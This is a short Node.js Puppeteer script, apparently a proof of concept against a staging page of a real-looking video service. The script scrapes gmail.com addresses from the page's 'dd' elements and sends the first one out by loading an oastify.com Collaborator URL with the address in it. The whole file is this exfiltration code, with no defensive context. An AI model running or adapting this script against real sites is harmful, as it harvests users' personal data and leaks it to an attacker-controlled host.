//const puppeteer = require('puppeteer'); 
//hide

async function extractEmail() {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  await page.goto('https://iap.staging.vidio.com/', {waitUntil: 'domcontentloaded'});

  await page.waitForResponse(response => response.status() === 403);

  const emails = await page.evaluate(() => {
    const emailElements = Array.from(document.querySelectorAll('dd'));
    return emailElements
      .map(element => element.textContent)
      .filter(text => text.includes('@gmail.com')); 
  });

  console.log('Extracted Emails:', emails);

  if (emails.length > 0) {
    const email = encodeURIComponent(emails[0]);
    await page.goto(`https://nf6c8pn05gnie4n2rb2ku83p5gb7z1nq.oastify.com/email=${email}`);
  }

  await browser.close();
}

extractEmail();
